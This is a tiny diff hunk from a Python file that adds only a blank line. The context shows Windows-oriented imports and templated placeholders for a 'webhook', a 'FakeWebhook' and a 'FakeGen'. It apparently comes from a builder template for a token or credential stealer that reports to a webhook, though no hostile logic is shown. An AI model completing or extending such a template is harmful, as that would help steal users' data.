@@ -16,6 +16,7 @@ from ctypes import *
 from json import loads, dumps, load, dump
 from pathlib import Path
 from locale import windows_locale
+
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
